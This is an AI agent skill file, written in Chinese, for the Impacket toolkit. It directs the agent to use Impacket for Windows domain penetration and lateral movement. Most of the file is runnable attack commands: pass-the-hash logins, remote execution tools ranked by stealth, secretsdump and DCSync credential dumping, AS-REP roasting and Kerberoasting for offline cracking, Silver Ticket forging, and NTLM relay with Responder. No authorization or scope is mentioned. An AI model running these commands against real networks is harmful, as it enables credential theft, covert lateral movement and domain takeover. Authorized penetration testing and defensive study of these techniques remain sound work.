---
name: impacket-toolkit
description: "Impacket Windows 协议工具集。当需要通过 Windows 协议（SMB/MSRPC/LDAP/Kerberos/WMI/DCOM/MSSQL）进行远程操作时使用。Impacket 提供了完整的 Windows 协议 Python 实现，核心工具包括 secretsdump（导出凭据）、psexec/smbexec/wmiexec/dcomexec（远程命令执行）、GetNPUsers/GetUserSPNs（Kerberos 攻击）、ntlmrelayx（NTLM 中继）。这是域渗透和 Windows 横向移动的基础工具集。涉及 Windows 远程执行、凭据导出、Kerberos 攻击、NTLM 中继、SMB 操作的场景都应使用此技能"
metadata:
  tags: "impacket,secretsdump,psexec,wmiexec,smbexec,dcomexec,ntlmrelayx,kerberos,smb,windows,域,横向移动,凭据,GetNPUsers,GetUserSPNs"
  category: "tool"
---

# Impacket Windows 协议工具集

Impacket 用纯 Python 实现了 Windows 网络协议栈，在 Linux 上就能直接操作 Windows 目标——不需要在目标上安装任何东西。

项目地址：https://github.com/fortra/impacket

## 认证方式

Impacket 所有工具都支持多种认证方式，理解这些格式很重要：

```bash
# 密码认证
tool.py DOMAIN/user:password@TARGET

# NTLM 哈希传递 (Pass-the-Hash)
tool.py DOMAIN/user@TARGET -hashes LM:NTLM
tool.py DOMAIN/user@TARGET -hashes :NTLM  # LM 部分可省略

# Kerberos 票据认证
export KRB5CCNAME=/tmp/user.ccache
tool.py DOMAIN/user@TARGET -k -no-pass

# 本地用户（不在域内）
tool.py ./administrator:password@TARGET
```

## 远程命令执行

从无交互到全交互，选最稳定的：

```bash
# psexec — 通过 SMB 创建服务执行（最常用，需要管理员权限）
psexec.py DOMAIN/admin:password@TARGET
psexec.py DOMAIN/admin@TARGET -hashes :NTLM_HASH

# smbexec — 通过 SMB 管道执行（不上传二进制，更隐蔽）
smbexec.py DOMAIN/admin:password@TARGET

# wmiexec — 通过 WMI 执行（不创建服务，最隐蔽）
wmiexec.py DOMAIN/admin:password@TARGET

# dcomexec — 通过 DCOM 执行（备选）
dcomexec.py DOMAIN/admin:password@TARGET

# atexec — 通过计划任务执行（不需要交互式 shell）
atexec.py DOMAIN/admin:password@TARGET "whoami"
```

### 选择建议

| 工具 | 协议 | 端口 | 隐蔽性 | 交互式 |
|------|------|------|--------|--------|
| wmiexec | WMI/DCOM | 135 | ⭐⭐⭐ | ✅ |
| smbexec | SMB | 445 | ⭐⭐ | ✅ |
| psexec | SMB | 445 | ⭐ | ✅ |
| atexec | 任务计划 | 445 | ⭐⭐ | ❌ |
| dcomexec | DCOM | 135 | ⭐⭐ | ✅ |

## 凭据导出

```bash
# secretsdump — 域渗透最重要的工具，导出所有凭据
# 远程导出（需要域管/本地管理员）
secretsdump.py DOMAIN/admin:password@TARGET
secretsdump.py DOMAIN/admin@TARGET -hashes :NTLM_HASH

# 导出 DC 上所有域用户哈希（DCSync）
secretsdump.py DOMAIN/admin:password@DC_IP -just-dc

# 只导出 NTLM（不导出 Kerberos 密钥）
secretsdump.py DOMAIN/admin:password@DC_IP -just-dc-ntlm

# 从本地 SAM/SYSTEM 文件导出
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

## Kerberos 攻击

```bash
# AS-REP Roasting — 查找不需要预认证的账户
GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP -format hashcat
# 输出喂给 hashcat -m 18200

# Kerberoasting — 获取服务票据离线破解
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request
# 输出喂给 hashcat -m 13100

# 获取 TGT
getTGT.py DOMAIN/user:password -dc-ip DC_IP
# 生成 user.ccache → export KRB5CCNAME=user.ccache

# Silver Ticket
ticketer.py -nthash SERVICE_NTLM -domain-sid S-1-5-21-... -domain DOMAIN -spn cifs/TARGET user
```

## NTLM 中继

```bash
# 中继到 SMB（获取 shell 或 secretsdump）
ntlmrelayx.py -t smb://TARGET -smb2support
ntlmrelayx.py -t smb://TARGET -smb2support -c "whoami"

# 中继到 LDAP（域内 ACL 修改）
ntlmrelayx.py -t ldap://DC_IP --escalate-user user

# 中继到 ADCS Web Enrollment（ESC8）
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController

# 配合 Responder 使用
# 终端 1: responder -I eth0 -wv（抓 NTLM）
# 终端 2: ntlmrelayx.py -t smb://TARGET（中继 NTLM）
```

## SMB 文件操作

```bash
# SMB 客户端
smbclient.py DOMAIN/user:password@TARGET

# 列出共享
smbclient.py DOMAIN/user:password@TARGET -list

# 上传/下载文件
smbclient.py DOMAIN/user:password@TARGET
# > use SHARE_NAME
# > put local_file
# > get remote_file
```

## 决策树

```
需要做什么 Windows 操作？
├─ 远程执行命令 → wmiexec（隐蔽）/ psexec（稳定）
├─ 导出凭据/哈希 → secretsdump
├─ Kerberos 攻击 → GetNPUsers / GetUserSPNs
├─ NTLM 中继 → ntlmrelayx + Responder
├─ 文件操作 → smbclient
├─ 有密码 → 直接用 user:password
├─ 有 NTLM 哈希 → -hashes :NTLM（PTH）
└─ 有 Kerberos 票据 → -k -no-pass
```
